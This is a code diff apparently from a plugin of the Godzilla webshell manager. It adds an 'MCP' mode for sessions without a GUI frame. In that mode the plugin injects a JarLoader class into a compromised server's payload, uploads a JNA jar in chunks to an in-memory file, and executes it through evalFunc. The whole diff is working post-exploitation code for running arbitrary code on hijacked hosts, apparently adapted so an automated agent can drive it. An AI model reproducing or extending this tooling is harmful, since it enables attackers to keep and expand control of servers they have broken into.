@@ -13,6 +13,7 @@ import java.io.InputStream;
 import shells.plugins.PluginInfo;
 import util.Log;
 import util.functions;
+import util.http.ReqParameter;
 
 @PluginAnnotation(
         payloadName = "JavaDynamicPayload",
@@ -128,19 +129,59 @@ public class TH_TOOLS extends shells.plugins.generic.TH_TOOLS {
                 try {
                     if (this.jarLoader == null) {
                         ShellManage shellManage = this.shellEntity.getFrame();
-                        this.jarLoader = (JarLoader)shellManage.getPlugin("JarLoader");
+                        if (shellManage != null) {
+                            this.jarLoader = (JarLoader)shellManage.getPlugin("JarLoader");
+                        }
                     }
                 } catch (Exception var3) {
-                    GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "no find plugin JarLoader!");
+                    Log.error(var3);
                     return false;
                 }
             }
 
-            if (!(this.loadJar = this.jarLoader.hasClass("jna.sun.jna.platform.godzilla.AsmCodeLoad"))) {
-                this.loadJar = this.jarLoader.loadJar(jar);
+            if (this.jarLoader != null) {
+                if (!(this.loadJar = this.jarLoader.hasClass("jna.sun.jna.platform.godzilla.AsmCodeLoad"))) {
+                    this.loadJar = this.jarLoader.loadJar(jar);
+                }
+            } else {
+                // MCP 无 frame 会话: 直接 include JarLoader.classs + 分片上传 mem://jar + evalFunc 加载
+                this.loadJar = mcpLoadJar(jar);
             }
 
             return this.loadJar;
+        }
+    }
+
+    /** MCP 兼容: 绕过 GUI ShellFileManager, 用 payload.bigFileUpload 分片上传 GodzillaJna.jar */
+    private boolean mcpLoadJar(byte[] jar) {
+        try {
+            InputStream in = this.getClass().getResourceAsStream("assets/JarLoader.classs");
+            if (in == null) return false;
+            byte[] data = functions.readInputStream(in);
+            in.close();
+            if (!this.payload.include("plugin.JarLoader", data)) {
+                Log.log("mcpLoadJar: include JarLoader.classs fail");
+                return false;
+            }
+            String memFile = "mem://jar" + jar.hashCode();
+            int once = this.shellEntity.getOnceBigFileUploadByteNum();
+            for (int off = 0; off < jar.length; off += once) {
+                byte[] chunk = java.util.Arrays.copyOfRange(jar, off, Math.min(off + once, jar.length));
+                String flag = this.payload.bigFileUpload(memFile, (long)off, chunk);
+                if (!"ok".equals(flag)) {
+                    Log.log("mcpLoadJar: bigFileUpload fail at " + off + " flag=" + flag);
+                    return false;
+                }
+            }
+            ReqParameter rp = new ReqParameter();
+            rp.add("memFileName", memFile);
+            byte[] r = this.payload.evalFunc("plugin.JarLoader", "loadJarFromMemFile", rp);
+            String s = this.encoding.Decoding(r);
+            Log.log("mcpLoadJar: " + s);
+            return "ok".equals(s);
+        } catch (Exception e) {
+            Log.error(e);
+            return false;
         }
     }
 
